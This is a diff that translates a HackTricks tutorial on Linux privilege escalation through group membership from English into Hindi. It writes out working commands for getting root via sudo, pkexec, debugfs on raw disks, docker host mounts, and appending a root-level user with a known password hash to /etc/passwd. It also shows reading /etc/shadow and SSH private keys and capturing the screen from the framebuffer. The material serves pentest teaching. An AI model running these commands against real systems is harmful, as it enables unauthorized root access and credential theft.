@@ -1,23 +1,22 @@
-# Interesting Groups - Linux Privesc
+# दिलचस्प समूह - लिनक्स प्राइवेस्क
 
 <details>
 
-<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>
+<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ हैकट्रिक्स क्लाउड ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 ट्विटर 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ ट्विच 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 यूट्यूब 🎥</strong></a></summary>
 
-* Do you work in a **cybersecurity company**? Do you want to see your **company advertised in HackTricks**? or do you want to have access to the **latest version of the PEASS or download HackTricks in PDF**? Check the [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
-* Discover [**The PEASS Family**](https://opensea.io/collection/the-peass-family), our collection of exclusive [**NFTs**](https://opensea.io/collection/the-peass-family)
-* Get the [**official PEASS & HackTricks swag**](https://peass.creator-spring.com)
-* **Join the** [**💬**](https://emojipedia.org/speech-balloon/) [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** me on **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
-* **Share your hacking tricks by submitting PRs to the** [**hacktricks repo**](https://github.com/carlospolop/hacktricks) **and** [**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud).
+* क्या आप **साइबर सुरक्षा कंपनी** में काम करते हैं? क्या आप अपनी कंपनी को **हैकट्रिक्स में विज्ञापित** देखना चाहते हैं? या क्या आपको **PEASS की नवीनतम संस्करण या HackTricks को PDF में डाउनलोड करने का उपयोग** करना चाहिए? [**सदस्यता योजनाएं**](https://github.com/sponsors/carlospolop) की जांच करें!
+* [**द पीएस फैमिली**](https://opensea.io/collection/the-peass-family) की खोज करें, हमारा विशेष [**NFT संग्रह**](https://opensea.io/collection/the-peass-family)
+* [**आधिकारिक PEASS और HackTricks स्वैग**](https://peass.creator-spring.com) प्राप्त करें
+* [**💬**](https://emojipedia.org/speech-balloon/) [**डिस्कॉर्ड समूह**](https://discord.gg/hRep4RUj7f) या [**टेलीग्राम समूह**](https://t.me/peass) में **शामिल हों** या मुझे **ट्विटर** पर **फॉलो** करें [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
+* **हैकिंग ट्रिक्स साझा करें और PR जमा करके** [**hacktricks रेपो**](https://github.com/carlospolop/hacktricks) **और** [**hacktricks-cloud रेपो**](https://github.com/carlospolop/hacktricks-cloud) **को**.
 
 </details>
 
-## Sudo/Admin Groups
+## सुडो/एडमिन समूह
 
-### **PE - Method 1**
+### **PE - विधि 1**
 
-**Sometimes**, **by default (or because some software needs it)** inside the **/etc/sudoers** file you can find some of these lines:
-
+**कभी-कभी**, **डिफ़ॉल्ट रूप से (या कुछ सॉफ़्टवेयर की आवश्यकता होने के कारण)** **/etc/sudoers** फ़ाइल में आप इनमें से कुछ पंक्तियाँ ढूंढ सकते हैं:
 ```bash
 # Allow members of group sudo to execute any command
 %sudo	ALL=(ALL:ALL) ALL
@@ -25,47 +24,36 @@
 # Allow members of group admin to execute any command
 %admin 	ALL=(ALL:ALL) ALL
 ```
+इसका मतलब है कि **सूडो या एडमिन समूह में शामिल होने वाले कोई भी उपयोगकर्ता सूडो के रूप में कुछ भी चला सकता है**।
 
-This means that **any user that belongs to the group sudo or admin can execute anything as sudo**.
-
-If this is the case, to **become root you can just execute**:
-
+यदि ऐसा है, तो **रूट बनने के लिए आप सिर्फ यह चला सकते हैं**:
 ```
 sudo su
 ```
+### PE - तकनीक 2
 
-### PE - Method 2
-
-Find all suid binaries and check if there is the binary **Pkexec**:
-
+सभी suid बाइनरी ढूंढ़ें और देखें कि क्या बाइनरी **Pkexec** है:
 ```bash
 find / -perm -4000 2>/dev/null
 ```
-
-If you find that the binary **pkexec is a SUID binary** and you belong to **sudo** or **admin**, you could probably execute binaries as sudo using `pkexec`.\
-This is because typically those are the groups inside the **polkit policy**. This policy basically identifies which groups can use `pkexec`. Check it with:
-
+यदि आपको पता चलता है कि बाइनरी **pkexec एक SUID बाइनरी है** और आप **sudo** या **admin** समूह में शामिल हैं, तो आप `pkexec` का उपयोग करके बाइनरी को सुडो के रूप में निष्पादित कर सकते हैं।
+यह इसलिए है क्योंकि आमतौर पर ये समूह **polkit नीति** के भीतर होते हैं। यह नीति मूल रूप से पहचानती है कि कौन से समूह `pkexec` का उपयोग कर सकते हैं। इसे निम्नलिखित के साथ जांचें:
 ```bash
 cat /etc/polkit-1/localauthority.conf.d/*
 ```
+वहां आपको पता चलेगा कि कौन से समूहों को **pkexec** को निष्पादित करने की अनुमति है और **डिफ़ॉल्ट रूप से** कुछ लिनक्स डिस्ट्रो में समूह **sudo** और **admin** दिखाई देते हैं।
 
-There you will find which groups are allowed to execute **pkexec** and **by default** in some linux disctros the groups **sudo** and **admin** appear.
-
-To **become root you can execute**:
-
+**रूट बनने के लिए आप निम्नलिखित को निष्पादित कर सकते हैं**:
 ```bash
 pkexec "/bin/sh" #You will be prompted for your user password
 ```
-
-If you try to execute **pkexec** and you get this **error**:
-
+यदि आप **pkexec** को निष्पादित करने का प्रयास करते हैं और आपको यह **त्रुटि** मिलती है:
 ```bash
 polkit-agent-helper-1: error response to PolicyKit daemon: GDBus.Error:org.freedesktop.PolicyKit1.Error.Failed: No session for cookie
 ==== AUTHENTICATION FAILED ===
 Error executing command as another user: Not authorized
 ```
-
-**It's not because you don't have permissions but because you aren't connected without a GUI**. And there is a work around for this issue here: [https://github.com/NixOS/nixpkgs/issues/18012#issuecomment-335350903](https://github.com/NixOS/nixpkgs/issues/18012#issuecomment-335350903). You need **2 different ssh sessions**:
+**यह इसलिए नहीं है कि आपके पास अनुमतियाँ नहीं हैं, बल्कि इसलिए है कि आप GUI के बिना कनेक्ट नहीं हैं।** और इस मुद्दे का एक काम करने का तरीका यहां है: [https://github.com/NixOS/nixpkgs/issues/18012#issuecomment-335350903](https://github.com/NixOS/nixpkgs/issues/18012#issuecomment-335350903)। आपको **2 अलग-अलग ssh सत्र** की आवश्यकता होगी:
 
 {% code title="session1" %}
 ```bash
@@ -73,8 +61,6 @@ echo $$ #Step1: Get current PID
 pkexec "/bin/bash" #Step 3, execute pkexec
 #Step 5, if correctly authenticate, you will have a root session
 ```
-{% endcode %}
-
 {% code title="session2" %}
 ```bash
 pkttyagent --process <PID of session1> #Step 2, attach pkttyagent to session1
@@ -82,38 +68,29 @@ pkttyagent --process <PID of session1> #Step 2, attach pkttyagent to session1
 ```
 {% endcode %}
 
-## Wheel Group
+## व्हील समूह
 
-**Sometimes**, **by default** inside the **/etc/sudoers** file you can find this line:
-
+कभी-कभी, **डिफ़ॉल्ट** रूप से **/etc/sudoers** फ़ाइल में आप इस लाइन को पाएंगे:
 ```
 %wheel	ALL=(ALL:ALL) ALL
 ```
+इसका मतलब है कि **व्हील समूह में शामिल होने वाले कोई भी उपयोगकर्ता sudo के रूप में कुछ भी निष्पादित कर सकता है**।
 
-This means that **any user that belongs to the group wheel can execute anything as sudo**.
-
-If this is the case, to **become root you can just execute**:
-
+यदि ऐसा है, तो **रूट बनने के लिए आप सिर्फ निम्नलिखित को निष्पादित कर सकते हैं**:
 ```
 sudo su
 ```
+## शैडो ग्रुप
 
-## Shadow Group
-
-Users from the **group shadow** can **read** the **/etc/shadow** file:
-
+**शैडो ग्रुप** के उपयोगकर्ता **/etc/shadow** फ़ाइल को **पढ़ सकते हैं**:
 ```
 -rw-r----- 1 root shadow 1824 Apr 26 19:10 /etc/shadow
 ```
+## डिस्क समूह
 
-So, read the file and try to **crack some hashes**.
+यह विशेषाधिकार प्रायः **रूट पहुंच के समान** होता है क्योंकि आप मशीन के अंदर सभी डेटा तक पहुंच सकते हैं।
 
-## Disk Group
-
-This privilege is almost **equivalent to root access** as you can access all the data inside of the machine.
-
-Files:`/dev/sd[a-z][1-9]`
-
+फ़ाइलें: `/dev/sd[a-z][1-9]`
 ```bash
 df -h #Find where "/" is mounted
 debugfs /dev/sda1
@@ -122,57 +99,47 @@ debugfs: ls
 debugfs: cat /root/.ssh/id_rsa
 debugfs: cat /etc/shadow
 ```
-
-Note that using debugfs you can also **write files**. For example to copy `/tmp/asd1.txt` to `/tmp/asd2.txt` you can do:
-
+ध्यान दें कि debugfs का उपयोग करके आप **फ़ाइलें लिख सकते हैं**। उदाहरण के लिए, `/tmp/asd1.txt` को `/tmp/asd2.txt` में कॉपी करने के लिए आप निम्नलिखित कर सकते हैं:
 ```bash
 debugfs -w /dev/sda1
 debugfs:  dump /tmp/asd1.txt /tmp/asd2.txt
 ```
+यदि आप **रूट के स्वामित्व वाली फ़ाइलें लिखने** की कोशिश करें (जैसे `/etc/shadow` या `/etc/passwd`), तो आपको "**अनुमति निषेध**" त्रुटि मिलेगी।
 
-However, if you try to **write files owned by root** (like `/etc/shadow` or `/etc/passwd`) you will have a "**Permission denied**" error.
+## वीडियो समूह
 
-## Video Group
-
-Using the command `w` you can find **who is logged on the system** and it will show an output like the following one:
-
+`w` कमांड का उपयोग करके आप **सिस्टम पर कौन लॉग इन है** यह पता लगा सकते हैं और यह निम्नलिखित तरह का आउटपुट दिखाएगा:
 ```bash
 USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
 yossi    tty1                      22:16    5:13m  0.05s  0.04s -bash
 moshe    pts/1    10.10.14.44      02:53   24:07   0.06s  0.06s /bin/bash
 ```
+**tty1** यह दर्शाता है कि मशीन पर उपयोगकर्ता **yossi शारीरिक रूप से लॉग इन** हैं।
 
-The **tty1** means that the user **yossi is logged physically** to a terminal on the machine.
-
-The **video group** has access to view the screen output. Basically you can observe the the screens. In order to do that you need to **grab the current image on the screen** in raw data and get the resolution that the screen is using. The screen data can be saved in `/dev/fb0` and you could find the resolution of this screen on `/sys/class/graphics/fb0/virtual_size`
-
+**वीडियो समूह** को स्क्रीन आउटपुट देखने की अनुमति होती है। मूल रूप से, आप स्क्रीन पर दिख रही छवि को रॉ डेटा में प्राप्त कर सकते हैं और स्क्रीन द्वारा उपयोग की जा रही रिज़ॉल्यूशन प्राप्त कर सकते हैं। स्क्रीन डेटा को `/dev/fb0` में सहेजा जा सकता है और आप इस स्क्रीन की रिज़ॉल्यूशन को `/sys/class/graphics/fb0/virtual_size` पर ढूंढ सकते हैं।
 ```bash
 cat /dev/fb0 > /tmp/screen.raw
 cat /sys/class/graphics/fb0/virtual_size
 ```
-
-To **open** the **raw image** you can use **GIMP**, select the \*\*`screen.raw` \*\* file and select as file type **Raw image data**:
+उदाहरण के लिए, आपको गिम्प का उपयोग करके रॉ इमेज खोलने के लिए करना होगा, `screen.raw` फ़ाइल का चयन करें और फ़ाइल प्रकार के रूप में **रॉ इमेज डेटा** का चयन करें:
 
 ![](<../../../.gitbook/assets/image (287) (1).png>)
 
-Then modify the Width and Height to the ones used on the screen and check different Image Types (and select the one that shows better the screen):
+फिर चौड़ाई और ऊचाई को स्क्रीन पर उपयोग किए जाने वाले को बदलें और विभिन्न इमेज प्रकारों की जांच करें (और उसे चुनें जो स्क्रीन को बेहतर दिखाता है):
 
 ![](<../../../.gitbook/assets/image (288).png>)
 
-## Root Group
+## रूट समूह
 
-It looks like by default **members of root group** could have access to **modify** some **service** configuration files or some **libraries** files or **other interesting things** that could be used to escalate privileges...
+ऐसा लगता है कि डिफ़ॉल्ट रूप से **रूट समूह के सदस्य** को कुछ **सेवा** कॉन्फ़िगरेशन फ़ाइलें या कुछ **लाइब्रेरी** फ़ाइलें या **अन्य रोचक चीजें** में पहुंच हो सकती है जिनका उपयोग विशेषाधिकारों को बढ़ाने के लिए किया जा सकता है...
 
-**Check which files root members can modify**:
-
+**जांचें कि रूट सदस्य कौन सी फ़ाइलें संशोधित कर सकते हैं**:
 ```bash
 find / -group root -perm -g=w 2>/dev/null
 ```
+## डॉकर समूह
 
-## Docker Group
-
-You can **mount the root filesystem of the host machine to an instance’s volume**, so when the instance starts it immediately loads a `chroot` into that volume. This effectively gives you root on the machine.
-
+आप एक इंस्टेंस के वॉल्यूम में होस्ट मशीन के रूट फ़ाइल सिस्टम को माउंट कर सकते हैं, इसलिए जब इंस्टेंस शुरू होता है तो वह तत्काल उस वॉल्यूम में एक `chroot` लोड करता है। इससे आपको मशीन पर रूट उपयोगकर्ता मिल जाता है।
 ```bash
 docker image #Get images from the docker service
 
@@ -184,43 +151,42 @@ echo 'toor:$1$.ZcF5ts0$i4k6rQYzeegUkacRCvfxC0:0:0:root:/root:/bin/sh' >> /etc/pa
 #Ifyou just want filesystem and network access you can startthe following container:
 docker run --rm -it --pid=host --net=host --privileged -v /:/mnt <imagename> chroot /mnt bashbash
 ```
-
-Finally, if you don't like any of the suggestions of before, or they aren't working for some reason (docker api firewall?) you could always try to **run a privileged container and escape from it** as explained here:
+अंत में, यदि आपको पहले के किसी सुझाव पसंद नहीं आते हैं या किसी कारणवश वे काम नहीं कर रहे हैं (डॉकर एपीआई फ़ायरवॉल?) तो आप हमेशा कोशिश कर सकते हैं **एक विशेषाधिकारी वाले कंटेनर को चलाने और उससे बाहर निकलने की** जैसा यहां समझाया गया है:
 
 {% content-ref url="../docker-security/" %}
 [docker-security](../docker-security/)
 {% endcontent-ref %}
 
-If you have write permissions over the docker socket read [**this post about how to escalate privileges abusing the docker socket**](../#writable-docker-socket)**.**
+यदि आपके पास डॉकर सॉकेट पर लिखने की अनुमति है, तो [**इस पोस्ट को पढ़ें जिसमें डॉकर सॉकेट का दुरुपयोग करके विशेषाधिकारों को बढ़ावा देने के बारे में बताया गया है**](../#writable-docker-socket)**.**
 
 {% embed url="https://github.com/KrustyHack/docker-privilege-escalation" %}
 
 {% embed url="https://fosterelli.co/privilege-escalation-via-docker.html" %}
 
-## lxc/lxd Group
+## lxc/lxd समूह
 
 {% content-ref url="./" %}
 [.](./)
 {% endcontent-ref %}
 
-## Adm Group
+## Adm समूह
 
-Usually **members** of the group **`adm`** have permissions to **read log** files located inside _/var/log/_.\
-Therefore, if you have compromised a user inside this group you should definitely take a **look to the logs**.
+आमतौर पर **`adm`** समूह के **सदस्य** को _/var/log/_ में स्थित लॉग फ़ाइलें पढ़ने की अनुमति होती है।\
+इसलिए, यदि आप इस समूह के भीतर एक उपयोगकर्ता को हथिया लिया है, तो आपको निश्चित रूप से लॉगों की **जांच करनी चाहिए**।
 
-## Auth group
+## Auth समूह
 
-Inside OpenBSD the **auth** group usually can write in the folders _**/etc/skey**_ and _**/var/db/yubikey**_ if they are used.\
-These permissions may be abused with the following exploit to **escalate privileges** to root: [https://raw.githubusercontent.com/bcoles/local-exploits/master/CVE-2019-19520/openbsd-authroot](https://raw.githubusercontent.com/bcoles/local-exploits/master/CVE-2019-19520/openbsd-authroot)
+OpenBSD के अंदर, यदि उपयोग किए जाते हैं तो **auth** समूह आमतौर पर _**/etc/skey**_ और _**/var/db/yubikey**_ फ़ोल्डर में लिख सकता है।\
+इन अनुमतियों का उपयोग निम्नलिखित एक्सप्लॉइट के साथ **विशेषाधिकारों को बढ़ाने** के लिए किया जा सकता है: [https://raw.githubusercontent.com/bcoles/local-exploits/master/CVE-2019-19520/openbsd-authroot](https://raw.githubusercontent.com/bcoles/local-exploits/master/CVE-2019-19520/openbsd-authroot)
 
 <details>
 
 <summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>
 
-* Do you work in a **cybersecurity company**? Do you want to see your **company advertised in HackTricks**? or do you want to have access to the **latest version of the PEASS or download HackTricks in PDF**? Check the [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
-* Discover [**The PEASS Family**](https://opensea.io/collection/the-peass-family), our collection of exclusive [**NFTs**](https://opensea.io/collection/the-peass-family)
-* Get the [**official PEASS & HackTricks swag**](https://peass.creator-spring.com)
-* **Join the** [**💬**](https://emojipedia.org/speech-balloon/) [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** me on **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
-* **Share your hacking tricks by submitting PRs to the** [**hacktricks repo**](https://github.com/carlospolop/hacktricks) **and** [**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud).
+* क्या आप **साइबर सुरक्षा कंपनी** में काम करते हैं? क्या आप अपनी कंपनी को **HackTricks में विज्ञापित** देखना चाहते हैं? या क्या आपको **PEASS की नवीनतम संस्करण या HackTricks को PDF में डाउनलोड करने की** सुविधा चाहिए? [**सदस्यता योजनाएं**](https://github.com/sponsors/carlospolop) की जांच करें!
+* खोजें [**The PEASS Family**](https://opensea.io/collection/the-peass-family), हमारा विशेष संग्रह [**NFTs**](https://opensea.io/collection/the-peass-family)
+* प्राप्त करें [**आधिकारिक PEASS और HackTricks swag**](https://peass.creator-spring.com)
+* **शामिल हों** [**💬**](https://emojipedia.org/speech-balloon/) [**Discord समूह**](https://discord.gg/hRep4RUj7f) या [**टेलीग्राम समूह**](https://t.me/peass) या मुझे **ट्विटर** पर **फ़ॉलो** करें [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
+* **अपने हैकिंग ट्रिक्स साझा करें, PRs सबमिट करके** [**hacktricks repo**](https://github.com/carlospolop/hacktricks) **और** [**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud) **में।**
 
 </details>
